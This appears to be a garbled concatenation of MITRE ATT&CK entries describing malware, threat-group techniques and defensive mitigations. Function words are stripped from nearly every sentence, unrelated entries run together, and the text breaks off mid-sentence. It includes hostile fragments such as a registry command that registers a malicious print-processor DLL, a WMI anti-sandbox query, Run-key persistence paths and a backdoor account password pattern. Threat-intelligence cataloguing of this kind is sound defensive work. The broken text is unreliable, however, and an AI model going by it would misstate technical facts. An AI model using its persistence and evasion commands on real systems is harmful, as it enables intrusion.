Registry key `HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\UDPrint” /v Driver /d “spool.dll /f` load malware Print Processor.(Citation: TrendMicro EarthLusca 2022) [Tropic Trooper](https://attack.mitre.org/groups/G0081) SSL connect C2 servers.(Citation: TrendMicro Tropic Trooper Mar 2018)(Citation: TrendMicro Tropic Trooper 2020) [Wiarp](https://attack.mitre.org/software/S0206) creates backdoor remote attackers create service.(Citation: Symantec Wiarp 2012) (Citation: Kaspersky Turla) [HermeticWiper](https://attack.mitre.org/software/S0697) ability corrupt disk partitions, damage Master Boot Record (MBR), overwrite Master File Table (MFT) physical drives.(Citation: SentinelOne Hermetic Wiper February 2022)(Citation: Symantec Ukraine Wipers February 2022)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Qualys Hermetic Wiper March 2022) [Dragonfly](https://attack.mitre.org/groups/G0035) cleared Windows event logs logs produced tools used, including system, security, terminal services, remote services, audit logs. actors deleted specific Registry keys.(Citation: US-CERT TA18-074A) [Stuxnet](https://attack.mitre.org/software/S0603) checks specific operating systems 32-bit machines, Registry keys, dates vulnerabilities, exit execution values met.(Citation: Symantec W.32 Stuxnet Dossier)  [OopsIE](https://attack.mitre.org/software/S0264) performs anti-VM sandbox checks victim's machine. technique perform WMI query <code>SELECT * MSAcpi_ThermalZoneTemperature</code> check temperature it’s running virtual environment.(Citation: Unit 42 OilRig Sept 2018) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors renamed malicious executable `rundll32.exe` blend Windows files.(Citation: Cybereason OperationCuckooBees 2022) [Machete](https://attack.mitre.org/software/S0409) collects MAC address target network configuration information.(Citation: ESET Machete July 2019)(Citation: 360 Machete Sep 2020) [Expand](https://attack.mitre.org/software/S0361) download upload file network share.(Citation: LOLBAS Expand) (Citation: ESET Dukes October 2019)(Citation: Secureworks IRON HEMLOCK Profile) [Nerex](https://attack.mitre.org/software/S0210) creates Registry subkey registers service.(Citation: Symantec Nerex 2012) [ObliqueRAT](https://attack.mitre.org/software/S0644) break files chunks prepare exfiltration.(Citation: Talos Oblique RAT March 2021) [FIN7](https://attack.mitre.org/groups/G0046) images embedded document lures activate payload user double clicks avoid sandboxes.(Citation: FireEye FIN7 April 2017) [Hacking Team UEFI Rootkit](https://attack.mitre.org/software/S0047) UEFI BIOS rootkit developed company Hacking Team persist remote access software targeted systems.(Citation: TrendMicro Hacking Team UEFI) [Lazarus Group](https://attack.mitre.org/groups/G0032) maintained persistence loading malicious code startup folder adding Registry key.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster RATs)(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: McAfee Lazarus Jul 2020)(Citation: Lazarus APT January 2022) [Grandoreiro](https://attack.mitre.org/software/S0531) BMP images resources Portable Executable (PE) file increasing binary 300MB size.(Citation: ESET Grandoreiro April 2020) Disable remove unnecessary unused shells interpreters. [GrimAgent](https://attack.mitre.org/software/S0632) Native API including <code>GetProcAddress</code> <code>ShellExecuteW</code>.(Citation: IB GrimAgent July 2021) [Dipsind](https://attack.mitre.org/software/S0200) spawn remote shells.(Citation: PLATINUM April 2016) [HermeticWiper](https://attack.mitre.org/software/S0697) disable VSS service compromised host service control manager.(Citation: Crowdstrike DriveSlayer February 2022)(Citation: ESET Hermetic Wizard March 2022)(Citation: Qualys Hermetic Wiper March 2022) Limit user access utilities 'systemctl' users legitimate need. Monitor API calls employ detect avoid virtualization analysis environments. Detecting actions virtualization sandbox identification difficult depending adversary's implementation monitoring required. [Remexi](https://attack.mitre.org/software/S0375) [BITSAdmin](https://attack.mitre.org/software/S0190) communicate C2 server HTTP.(Citation: Securelist Remexi Jan 2019) Monitor API calls finding local permission settings, NetLocalGroupEnum. [WannaCry](https://attack.mitre.org/software/S0366) utilizes <code>wmic</code> delete shadow copies.(Citation: LogRhythm WannaCry)(Citation: FireEye WannaCry 2017)(Citation: SecureWorks WannaCry Analysis) [APT41](https://attack.mitre.org/groups/G0096) created modified startup files persistence.(Citation: FireEye APT41 Aug 2019)(Citation: IB APT 41 June 2021) [APT41](https://attack.mitre.org/groups/G0096) registry key <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost</code> establish persistence Cobalt Strike.(Citation: FireEye APT41 March 2020) [RawDisk](https://attack.mitre.org/software/S0364) [Shamoon](https://attack.mitre.org/software/S0140) overwrite components disk structure MBR disk partitions.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Unit 42 Shamoon3 2018) [EKANS](https://attack.mitre.org/software/S0605) Windows Mangement Instrumentation (WMI) calls execute operations.(Citation: Dragos EKANS) (Citation: Bitdefender FunnyDream Campaign November 2020) [Windshift](https://attack.mitre.org/groups/G0112) created LNK files Startup folder establish persistence.(Citation: BlackBerry Bahamut) [FatDuke](https://attack.mitre.org/software/S0512) regularly repacked operators create binaries evade detection.(Citation: ESET Dukes October 2019) [MarkiRAT](https://attack.mitre.org/software/S0652) check running processes victim’s machine Kaspersky Bitdefender antivirus products.(Citation: Kaspersky Ferocious Kitten Jun 2021) (Citation: CrowdStrike Carbon Spider August 2021) [Flagpro](https://attack.mitre.org/software/S0696) collect data compromised host, including Windows authentication information.(Citation: NTT Security Flagpro December 2021) [Cobalt Group](https://attack.mitre.org/groups/G0080) injected code trusted processes.(Citation: IB Cobalt Aug 2017) [RTM](https://attack.mitre.org/software/S0148) samples signed code-signing certificates.(Citation: ESET RTM Feb 2017) [Winnti Windows](https://attack.mitre.org/software/S0141) installer loads DLL rundll32.(Citation: Winnti Jan 2017)(Citation: Novetta Winnti April 2015) [Ferocious](https://attack.mitre.org/software/S0679) <code>GET.WORKSPACE</code> Excel check mouse present.(Citation: Kaspersky WIRTE November 2021) [Octopus](https://attack.mitre.org/software/S0340) collect host IP address victim’s machine.(Citation: Securelist Octopus Oct 2018) DLL side-loading execute [BBSRAT](https://attack.mitre.org/software/S0127) legitimate Citrix executable, ssonsvr.exe. Citrix executable dropped [BBSRAT](https://attack.mitre.org/software/S0127) dropper.(Citation: Palo Alto Networks BBSRAT) [Rocke](https://attack.mitre.org/groups/G0106) installed "init.d" startup script maintain persistence.(Citation: Anomali Rocke March 2019)	 [TEMP.Veles](https://attack.mitre.org/groups/G0088) planted shells Outlook Exchange servers.(Citation: FireEye TRITON 2019) [Explosive](https://attack.mitre.org/software/S0569) collected username infected host.(Citation: CheckPoint Volatile Cedar March 2015)  [WannaCry](https://attack.mitre.org/software/S0366) enumerates current remote desktop sessions execute malware session.(Citation: LogRhythm WannaCry) [VERMIN](https://attack.mitre.org/software/S0257) encrypts collected files 3-DES.(Citation: Unit 42 VERMIN Jan 2018) [Leviathan](https://attack.mitre.org/groups/G0065) WMI persistence.(Citation: FireEye Periscope March 2018) [FoggyWeb](https://attack.mitre.org/software/S0661) retrieve token signing certificates token decryption certificates compromised FS server.(Citation: MSTIC FoggyWeb September 2021) Monitor newly executed processes (such <code>mstsc.exe</code>) [Valid Accounts](https://attack.mitre.org/techniques/T1078) log Remote Desktop Protocol (RDP). adversary perform actions spawn additional processes logged-on user. [PowerDuke](https://attack.mitre.org/software/S0139) commands time machine built, time, time zone.(Citation: Volexity PowerDuke November 2016) [OnionDuke](https://attack.mitre.org/software/S0052) Twitter backup C2.(Citation: F-Secure Dukes) [FIN5](https://attack.mitre.org/groups/G0053) tool GET2 Penetrator remote login hard-coded credentials.(Citation: DarkReading FireEye FIN5 Oct 2015)(Citation: Mandiant FIN5 GrrCON Oct 2016) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Catchamas](https://attack.mitre.org/software/S0261) adds service named NetAdapter establish persistence.(Citation: Symantec Catchamas April 2018) [SideTwist](https://attack.mitre.org/software/S0610) ability download additional files.(Citation: Check APT34 April 2021) [WindTail](https://attack.mitre.org/software/S0466) <code>open</code> command execute application.(Citation: objective-see windtail1 dec 2018) PowerShell profiles immutable changeable administrators limit ability adversaries easily create user level persistence. Monitor newly executed processes gather Policy settings identify paths privilege escalation, security measures applied domain, discover patterns domain objects manipulated blend environment. [Dtrack](https://attack.mitre.org/software/S0567) collect RegisteredOwner, RegisteredOrganization, InstallDate registry values.(Citation: CyberBit Dtrack) [TrickBot](https://attack.mitre.org/software/S0266) attempted users launch malicious documents deliver payload. (Citation: TrendMicro Trickbot Feb 2019)(Citation: Cyberreason Anchor December 2019) [SILENTTRINITY](https://attack.mitre.org/software/S0692) process owned specific user impersonate token.(Citation: GitHub SILENTTRINITY Modules July 2019) [DCSrv](https://attack.mitre.org/software/S1033) Windows API functions, including `DeviceIoControl`, encryption process.(Citation: Checkpoint MosesStaff Nov 2021) [Stolen Pencil](https://attack.mitre.org/groups/G0086) tools capable obtaining credentials browsers.(Citation: Netscout Stolen Pencil Dec 2018) [EnvyScout](https://attack.mitre.org/software/S0634) write files disk JavaScript modified version open-source tool FileSaver.(Citation: MSTIC Nobelium Toolset 2021) versions [DEATHRANSOM](https://attack.mitre.org/software/S0616) performed language keyboard layout checks; matched Russian, Kazakh, Belarusian, Ukrainian Tatar [DEATHRANSOM](https://attack.mitre.org/software/S0616) exit.(Citation: FireEye FiveHands April 2021) [Threat Group-3390](https://attack.mitre.org/groups/G0027) actors installed credential logger Exchange servers. [Threat Group-3390](https://attack.mitre.org/groups/G0027) leveraged reconnaissance framework, ScanBox, capture keystrokes.(Citation: Dell TG-3390)(Citation: Hacker News LuckyMouse June 2018)(Citation: Securelist LuckyMouse June 2018) (Citation: FireEye Fin8 2016) [Heyoka Backdoor](https://attack.mitre.org/software/S1027) check running service compromised host.(Citation: SentinelOne Aoqin Dragon June 2022) [Bundlore](https://attack.mitre.org/software/S0482) download execute versions itself.(Citation: MacKeeper Bundlore Apr 2019) Enable secure boot features validate digital signature boot environment image special purpose hardware device. validation check fails, device fail boot preventing loading unauthorized software. (Citation: Cisco IOS Software Integrity Assurance - Secure Boot)  Monitor anomalous Kerberos activity, enabling Audit Kerberos Service Ticket Operations log Kerberos TGS service ticket requests. investigate irregular patterns activity (ex: accounts numerous requests, Event 4769, time frame, request RC4 encryption [Type 0x17]). [Koadic](https://attack.mitre.org/software/S0250) 2 methods elevating integrity. bypass UAC `eventvwr.exe` `sdclt.exe`.(Citation: Github Koadic) [CaddyWiper](https://attack.mitre.org/software/S0693) `DsRoleGetPrimaryDomainInformation` determine role infected machine. [CaddyWiper](https://attack.mitre.org/software/S0693) halt execution compromised host identified domain controller.(Citation: Cisco CaddyWiper March 2022)(Citation: Malwarebytes IssacWiper CaddyWiper March 2022 ) [Mimikatz](https://attack.mitre.org/software/S0002)'s <code>SEKURLSA::Pth</code> module impersonate user, password hash, execute arbitrary commands.(Citation: Adsecurity Mimikatz Guide)(Citation: NCSC Joint Report Public Tools)(Citation: Cobalt Strike Manual 4.3 November 2020) [SUPERNOVA](https://attack.mitre.org/software/S0578) installed exploitation SolarWinds Orion API authentication bypass vulnerability (CVE-2020-10148).(Citation: Carnegie Mellon University Supernova Dec 2020)(Citation: Splunk Supernova Jan 2021) [TeamTNT](https://attack.mitre.org/groups/G0139) rootkits open-source Diamorphine rootkit custom bots hide cryptocurrency mining activities machine.(Citation: Trend Micro TeamTNT) (Citation: Cisco Talos Intelligence Group) Monitor contextual data file, include name, content (ex: signature, headers, data/media), user/ower, permissions, etc. [Dridex](https://attack.mitre.org/software/S0384)'s strings obfuscated RC4.(Citation: Checkpoint Dridex Jan 2021)  [REvil](https://attack.mitre.org/software/S0496) launch instance administrative rights runas.(Citation: Secureworks REvil September 2019) [SombRAT](https://attack.mitre.org/software/S0615) ability TCP sockets send data ICMP ping C2 server.(Citation: BlackBerry CostaRicto November 2020)(Citation: FireEye FiveHands April 2021) [Taidoor](https://attack.mitre.org/software/S0011) upload data files victim's machine.(Citation: TrendMicro Taidoor) [RainyDay](https://attack.mitre.org/software/S0629) file exfiltration tool files <code>C:\ProgramData\Adobe\temp</code> prior exfiltration.(Citation: Bitdefender Naikon April 2021) Audit Remote Desktop Users membership regularly. Remove unnecessary accounts Remote Desktop Users groups. [Aquatic Panda](https://attack.mitre.org/groups/G0143) attempted discover services party EDR products.(Citation: CrowdStrike AQUATIC PANDA December 2021) Configuration data [Rising Sun](https://attack.mitre.org/software/S0448) encrypted RC4 stream algorithm.(Citation: McAfee Sharpshooter December 2018)	 [TeamTNT](https://attack.mitre.org/groups/G0139) searched unsecured SSH keys.(Citation: Cado Security TeamTNT Worm August 2020)(Citation: Trend Micro TeamTNT) [Valak](https://attack.mitre.org/software/S0476) execute tasks OLE.(Citation: SentinelOne Valak June 2020) implementing disaster recovery plans procedures regular data backups restore organizational data.(Citation: Ready.gov DRP) Ensure backups stored protected common methods adversaries gain access manipulate backups. [Stolen Pencil](https://attack.mitre.org/groups/G0086) tool log keystrokes %userprofile%\appdata\roaming\apach.{txt,log}. (Citation: Netscout Stolen Pencil Dec 2018) [Valak](https://attack.mitre.org/software/S0476) execute JavaScript configuration data establishing persistence.(Citation: Cybereason Valak 2020) [DarkWatchman](https://attack.mitre.org/software/S0673) DGA generate domain C2.(Citation: Prevailion DarkWatchman 2021) [SoreFang](https://attack.mitre.org/software/S0516) gain persistence scheduled tasks.(Citation: CISA SoreFang July 2016) [MuddyWater](https://attack.mitre.org/groups/G0069) malware check running processes hard-coded list security tools malware researchers.(Citation: Securelist MuddyWater Oct 2018) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [Goopy](https://attack.mitre.org/software/S0477)'s decrypter inflated junk code legitimate API functions, included infinite loops avoid analysis.(Citation: Cybereason Cobalt Kitty 2017) [PlugX](https://attack.mitre.org/software/S0013) configured command control.(Citation: Dell TG-3390)(Citation: Proofpoint TA416 Europe March 2022) [DanBot](https://attack.mitre.org/software/S1014) download additional files targeted system.(Citation: SecureWorks August 2019) Policy configure block modifications W32Time parameters Registry. (Citation: W32Time 2017) [FoggyWeb](https://attack.mitre.org/software/S0661) masquerade output C2 commands fake, legitimately formatted WebP file.(Citation: MSTIC FoggyWeb September 2021) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) <code>net time</code> check local time target system.(Citation: Secureworks BRONZE BUTLER Oct 2017) variants [BACKSPACE](https://attack.mitre.org/software/S0031) encode C2 communications custom system.(Citation: FireEye APT30) [Evilnum](https://attack.mitre.org/groups/G0120) spearphishing emails designed trick recipient malicious shortcut links downloads .LNK file.(Citation: ESET EvilNum July 2020) [Bonadan](https://attack.mitre.org/software/S0486) download additional module cryptocurrency mining extension.(Citation: ESET ForSSHe December 2018) [Peppy](https://attack.mitre.org/software/S0643) screenshots targeted systems.(Citation: Proofpoint Operation Transparent Tribe March 2016) [QUADAGENT](https://attack.mitre.org/software/S0269) gathers current domain victim belongs to.(Citation: Unit 42 QUADAGENT July 2018) [OceanSalt](https://attack.mitre.org/software/S0346) extract drive endpoint search files system.(Citation: McAfee Oceansalt Oct 2018) Anti-virus automatically quarantine suspicious files. Data loss prevention detect block sensitive data uploaded browsers. [WastedLocker](https://attack.mitre.org/software/S0612) encrypt data leave ransom note.(Citation: Symantec WastedLocker June 2020)(Citation: NCC WastedLocker June 2020)(Citation: Sentinel Labs WastedLocker July 2020)  adding users "Protected Users" Active Directory security group. limit caching users' plaintext credentials.(Citation: Protected Users Security Group) [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) POST requests send receive C2 information.(Citation: Trend Micro MacOS Backdoor November 2020) [NETWIRE](https://attack.mitre.org/software/S0198) ability search files compromised host.(Citation: Proofpoint NETWIRE December 2020) Monitor contextual data file, include name, content (ex: signature, headers, data/media), user/ower, permissions set files directories hidden evade detection mechanisms. [LightNeuron](https://attack.mitre.org/software/S0395) collects Exchange emails matching rules configuration.(Citation: ESET LightNeuron 2019) [APT32](https://attack.mitre.org/groups/G0050) stood websites numerous articles content scraped Internet legitimate, include malicious JavaScript profile potential victim infect fake software update.(Citation: Volexity Ocean Lotus November 2020) [APT29](https://attack.mitre.org/groups/G0016) conducted brute force password spray attacks.(Citation: MSRC Nobelium June 2021)(Citation: MSTIC Nobelium Oct 2021) [Confucius](https://attack.mitre.org/groups/G0142) crafted victims malicious attachments gain initial access.(Citation: Uptycs Confucius APT Jan 2021) [ECCENTRICBANDWAGON](https://attack.mitre.org/software/S0593) [cmd](https://attack.mitre.org/software/S0106) execute commands victim’s machine.(Citation: CISA EB Aug 2020) [NanHaiShu](https://attack.mitre.org/software/S0228) launches script delete original decoy file cover tracks.(Citation: fsecure NanHaiShu July 2016) [Kinsing](https://attack.mitre.org/software/S0599) attempted brute force hosts SSH.(Citation: Aqua Kinsing April 2020) [HermeticWiper](https://attack.mitre.org/software/S0697) ability receive command parameter sleep prior carrying destructive actions targeted host.(Citation: Crowdstrike DriveSlayer February 2022) [Ramsay](https://attack.mitre.org/software/S0458) collect data network drives stage exfiltration.(Citation: Eset Ramsay 2020)	 [Egregor](https://attack.mitre.org/software/S0554) masqueraded svchost.exe process exfiltrate data.(Citation: Intrinsec Egregor Nov 2020) [Agent.btz](https://attack.mitre.org/software/S0092) obtains victim username saves file.(Citation: ThreatExpert Agent.btz) [FinFisher](https://attack.mitre.org/software/S0182) clears event logs <code> OpenEventLog/ClearEventLog APIs </code>.(Citation: FinFisher Citation)(Citation: FinFisher March 2018) Linux, auditd alert time user's actual effective (this sudo). technique abusing normal functionality macOS Linux systems, sudo ability log input output based <code>LOG_INPUT</code> <code>LOG_OUTPUT</code> directives <code>/etc/sudoers</code> file. monitoring <code>/usr/libexec/security_authtrampoline</code> executions AuthorizationExecuteWithPrivileges executed. MacOS logs AuthorizationExecuteWithPrivileges called. [Ecipekac](https://attack.mitre.org/software/S0624) XOR, AES, DES encrypt loader shellcode.(Citation: Securelist APT10 March 2021) [Pupy](https://attack.mitre.org/software/S0192) user PowerView execute “net user” commands create local accounts.(Citation: GitHub Pupy) [HOPLIGHT](https://attack.mitre.org/software/S0376) capability harvest credentials passwords SAM database.(Citation: US-CERT HOPLIGHT Apr 2019)	 Monitor unexpected deletion windows registry maliciously modify components victim environment hinder disable defensive mechanisms. [APT-C-36](https://attack.mitre.org/groups/G0099) modified variant [Imminent Monitor](https://attack.mitre.org/software/S0434).(Citation: QiAnXin APT-C-36 Feb2019) Monitor network data uncommon data flows client sending data receives server). Processes utilizing network network communication suspicious. [Siloscape](https://attack.mitre.org/software/S0623) maps host’s drive container creating global symbolic link host calling <code>NtSetInformationSymbolicLink</code>.(Citation: Unit 42 Siloscape Jun 2021) [Machete](https://attack.mitre.org/software/S0409) renamed task names masquerade legitimate Google Chrome, Java, Dropbox, Adobe Reader Python tasks.(Citation: ESET Machete July 2019)  starts, [BADNEWS](https://attack.mitre.org/software/S0128) crawls victim's mapped drives collects documents extensions: .doc, .docx, .pdf, .ppt, .pptx, .txt.(Citation: Forcepoint Monsoon) [Transparent Tribe](https://attack.mitre.org/groups/G0134) registered domains mimic file sharing, government, defense, websites targeted campaigns.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Talos Transparent Tribe 2021) [Leviathan](https://attack.mitre.org/groups/G0065) steganography hide stolen data files stored Github.(Citation: CISA AA21-200A APT40 July 2021) Creation services generate alterable event (ex: Event 4697 7045 (Citation: 4697 APR 2017)(Citation: Windows Event Forwarding FEB 2018)), unknown/abnormal drivers. New, benign services created installation software. Windows Server 2016, enable Windows Defender Credential Guard (Citation: Enable Cred Guard April 2017) lsass.exe isolated virtualized environment device drivers. (Citation: Credential Guard April 2017) [Metamorfo](https://attack.mitre.org/software/S0455) automatically collected mouse clicks, continuous screenshots machine, set timers collect contents clipboard browsing.(Citation: FireEye Metamorfo Apr 2018)  [OopsIE](https://attack.mitre.org/software/S0264) C2 communications.(Citation: Unit 42 OopsIE! Feb 2018)(Citation: Unit 42 OilRig Sept 2018) [Emotet](https://attack.mitre.org/software/S0367) exploiting SMB vulnerability exploit EternalBlue (MS17-010) achieve lateral movement propagation. (Citation: Symantec Emotet Jul 2018)(Citation: US-CERT Emotet Jul 2018)(Citation: Secureworks Emotet Nov 2018)(Citation: Red Canary Emotet Feb 2019)  Monitoring suspicious processes spawned gather variety perform forms [Discovery](https://attack.mitre.org/tactics/TA0007), short period time, aid detection. Detecting guardrails difficult depending implementation. [HyperBro](https://attack.mitre.org/software/S0398) unpack decrypt payload prior execution.(Citation: Trend Micro DRBControl February 2020)(Citation: Trend Micro Iron Tiger April 2021) [TeamTNT](https://attack.mitre.org/groups/G0139) disabled uninstalled security tools Alibaba, Tencent, BMC cloud monitoring agents cloud-based infrastructure.(Citation: ATT TeamTNT Chimaera September 2020)(Citation: Cisco Talos Intelligence Group) [Empire](https://attack.mitre.org/software/S0363) modify registry <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code> <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code> persistence.(Citation: Github PowerShell Empire) [Metamorfo](https://attack.mitre.org/software/S0455) communicated hosts raw TCP port 9999.(Citation: FireEye Metamorfo Apr 2018)  [FunnyDream](https://attack.mitre.org/software/S1044) execute commands, including gathering user information, send C2.(Citation: Bitdefender FunnyDream Campaign November 2020) (Citation: FireEye Periscope March 2018)(Citation: Accenture MUDCARP March 2019) [Sidewinder](https://attack.mitre.org/groups/G0121) malware collect files directories.(Citation: ATT Sidewinder January 2021) [HOPLIGHT](https://attack.mitre.org/software/S0376) launch cmd.exe execute commands system.(Citation: US-CERT HOPLIGHT Apr 2019)	 [Crimson](https://attack.mitre.org/software/S0115) identify user targeted system.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) [Prikormka](https://attack.mitre.org/software/S0113) DLL search hijacking persistence saving ntshrui.dll Windows directory load legitimate ntshrui.dll saved System32 subdirectory.(Citation: ESET Operation Groundbait) [InvisiMole](https://attack.mitre.org/software/S0260) register execution persistence Control Panel.(Citation: ESET InvisiMole June 2020) [Machete](https://attack.mitre.org/software/S0409)’s collected files exfiltrated automatically remote servers.(Citation: ESET Machete July 2019)  [DownPaper](https://attack.mitre.org/software/S0186) collects victim username sends C2 server.(Citation: ClearSky Charming Kitten Dec 2017) [HyperStack](https://attack.mitre.org/software/S0537) Windows API's <code>ConnectNamedPipe</code> <code>WNetAddConnection2</code> detect incoming connections connect remote shares.(Citation: Accenture HyperStack October 2020) Monitor API calls enumerating manipulating EWM GetWindowLong (Citation: GetWindowLong function) SetWindowLong (Citation: SetWindowLong function). Malware technique SendNotifyMessage (Citation: SendNotifyMessage function) trigger window procedure eventual malicious injection. (Citation: Elastic Process Injection July 2017) [TINYTYPHON](https://attack.mitre.org/software/S0131) searches drive OS, drive letters Z, documents matching extensions.(Citation: Forcepoint Monsoon) [Epic](https://attack.mitre.org/software/S0091) <code>net use</code>, <code>net session</code>, <code>netstat</code> commands gather network connections.(Citation: Kaspersky Turla)(Citation: Kaspersky Turla Aug 2014) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. SecretsDump [Mimikatz](https://attack.mitre.org/software/S0002) modules [Impacket](https://attack.mitre.org/software/S0357) perform credential dumping account password NTDS.dit.(Citation: Impacket Tools) [Zebrocy](https://attack.mitre.org/software/S0251) C2.(Citation: Palo Alto Sofacy 06-2018)(Citation: Unit42 Cannon Nov 2018)(Citation: ESET Zebrocy Nov 2018)(Citation: Unit42 Sofacy Dec 2018)(Citation: ESET Zebrocy 2019)(Citation: Accenture SNAKEMACKEREL Nov 2018) [Dyre](https://attack.mitre.org/software/S0024) decrypts resources targeting victim.(Citation: Symantec Dyre June 2015)(Citation: Malwarebytes Dyreza November 2015) [Revenge RAT](https://attack.mitre.org/software/S0379) Base64 encode C2 server.(Citation: Cylance Shaheen Nov 2018) [Mosquito](https://attack.mitre.org/software/S0256) upload download files victim.(Citation: ESET Turla Mosquito Jan 2018) [PoetRAT](https://attack.mitre.org/software/S0428) HTTPs C2 communications.(Citation: Talos PoetRAT October 2020) [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) hashed string prior exfiltration POST requests.(Citation: CISA MAR SLOTHFULMEDIA October 2020) [Astaroth](https://attack.mitre.org/software/S0373) delivered malicious e-mail attachments.(Citation: Securelist Brazilian Banking Malware July 2020) [WhisperGate](https://attack.mitre.org/software/S0689) delete tools compromised host execution.(Citation: Cisco Ukraine Wipers January 2022) [CosmicDuke](https://attack.mitre.org/software/S0050) keylogger.(Citation: F-Secure Dukes) [Attor](https://attack.mitre.org/software/S0438)'s dispatcher modify registry key.(Citation: ESET Attor Oct 2019) [Blue Mockingbird](https://attack.mitre.org/groups/G0108) JuicyPotato abuse <code>SeImpersonate</code> token privilege escalate application pool accounts NT Authority\SYSTEM.(Citation: RedCanary Mockingbird 2020) [IceApple](https://attack.mitre.org/software/S1022) collect files, passwords, data compromised host.(Citation: CrowdStrike IceApple 2022) [Octopus](https://attack.mitre.org/software/S0340) collect Windows directory searches compressed RAR files host.(Citation: Securelist Octopus Oct 2018)(Citation: Security Affairs DustSquad Oct 2018)(Citation: ESET Nomadic Octopus 2018) Monitor newly executed processes attempt hide artifacts behaviors evade detection. [Chinoxy](https://attack.mitre.org/software/S1041) established persistence `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` registry key loading dropper `(%COMMON_ STARTUP%\\eoffice.exe)`.(Citation: Bitdefender FunnyDream Campaign November 2020) (Citation: Kaspersky CactusPete Aug 2020) [Fox Kitten](https://attack.mitre.org/groups/G0117) exploited vulnerabilities Fortinet, PulseSecure, Palo Alto VPN appliances.(Citation: ClearkSky Fox Kitten February 2020)(Citation: Dragos PARISITE )(Citation: CrowdStrike PIONEER KITTEN August 2020)(Citation: CISA AA20-259A Iran-Based Actor September 2020)(Citation: ClearSky Pay2Kitten December 2020) [RedLeaves](https://attack.mitre.org/software/S0153) delete files.(Citation: PWC Cloud Hopper Technical Annex April 2017) (Citation: FireEye FIN6 Apr 2019) [CARROTBALL](https://attack.mitre.org/software/S0465) ability download install remote payload.(Citation: Unit 42 CARROTBAT January 2020) Monitor newly constructed network connections fallback alternate communication channels primary channel compromised inaccessible maintain reliable command control avoid data transfer thresholds. Processes utilizing network network communication suspicious. Ensure local administrator accounts complex, unique passwords systems network. [SEASHARPEE](https://attack.mitre.org/software/S0185) timestomp files victims shell.(Citation: FireEye APT34 Webinar Dec 2017) [Misdat](https://attack.mitre.org/software/S0083) collected files data compromised host.(Citation: Cylance Dust Storm) [Cobalt Strike](https://attack.mitre.org/software/S0154) set Beacon payload reach C2 server arbitrary random interval.(Citation: cobaltstrike manual) Correlate security systems login user active login session entered building VPN access). [Okrum](https://attack.mitre.org/software/S0439) collect victim username.(Citation: ESET Okrum July 2019) [S-Type](https://attack.mitre.org/software/S0085) create temporary user named `Lost_{Unique Identifier}` password `pond~!@6”{Unique Identifier}`.(Citation: Cylance Dust Storm) [Moses Staff](https://attack.mitre.org/groups/G1009) batch scripts disable Windows firewall specific remote machines.(Citation: Checkpoint MosesStaff Nov 2021) [Rover](https://attack.mitre.org/software/S0090) searches files attached removable drives based predefined list file extensions seconds.(Citation: Palo Alto Rover) (Citation: TeamTNT Cloud Enumeration) [SUNSPOT](https://attack.mitre.org/software/S0562) enumerated Orion software Visual Studio solution directory path.(Citation: CrowdStrike SUNSPOT Implant January 2021) Word document delivering [TYPEFRAME](https://attack.mitre.org/software/S0263) prompts user enable macro execution.(Citation: US-CERT TYPEFRAME June 2018) [FoggyWeb](https://attack.mitre.org/software/S0661)'s loader enumerate Common Language Runtimes (CLRs) running Application Domains compromised FS server's <code>Microsoft.IdentityServer.ServiceHost.exe</code> process.(Citation: MSTIC FoggyWeb September 2021) [Bazar](https://attack.mitre.org/software/S0534) collect time compromised host.(Citation: Cybereason Bazar July 2020)(Citation: NCC Team9 June 2020) Monitor newly constructed files establish persistence elevate privileges mechanisms trigger execution based specific events. Protect generated event files stored locally proper permissions authentication limit opportunities adversaries increase privileges preventing Privilege Escalation opportunities. [Daserf](https://attack.mitre.org/software/S0187) screenshots.(Citation: Trend Micro Daserf Nov 2017)(Citation: Secureworks BRONZE BUTLER Oct 2017) [Azorult](https://attack.mitre.org/software/S0344) download execute additional files. [Azorult](https://attack.mitre.org/software/S0344) downloaded ransomware payload called Hermes.(Citation: Unit42 Azorult Nov 2018)(Citation: Proofpoint Azorult July 2018) [SMOKEDHAM](https://attack.mitre.org/software/S0649) communicated C2 servers HTTPS POST requests.(Citation: FireEye SMOKEDHAM June 2021) [APT32](https://attack.mitre.org/groups/G0050)'s backdoor exfiltrated data channel C&C server.(Citation: ESET OceanLotus Mar 2019) Restrict execution vulnerable binaries privileged accounts lessen opportunities malicious usage. [Grandoreiro](https://attack.mitre.org/software/S0531) MSI files execute DLLs.(Citation: Securelist Brazilian Banking Malware July 2020) [Magic Hound](https://attack.mitre.org/groups/G0059) conducted widespread scanning identify public-facing systems vulnerable Log4j (CVE-2021-44228).(Citation: Check APT35 CharmPower January 2022) [Astaroth](https://attack.mitre.org/software/S0373) logs keystrokes victim's machine. (Citation: Cofense Astaroth Sept 2018) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) purchased domains targeted campaigns.(Citation: Targeting Elections September 2020) [Leviathan](https://attack.mitre.org/groups/G0065) created social media accounts targeting efforts.(Citation: CISA AA21-200A APT40 July 2021) [SUNBURST](https://attack.mitre.org/software/S0559) collected network interface MAC addresses loopback devices, IP address, DHCP configuration, domain information.(Citation: FireEye SUNBURST Backdoor December 2020) [Elise](https://attack.mitre.org/software/S0081) performs timestomping CAB file creates.(Citation: Lotus Blossom Jun 2015) Monitor traffic to/from known-bad 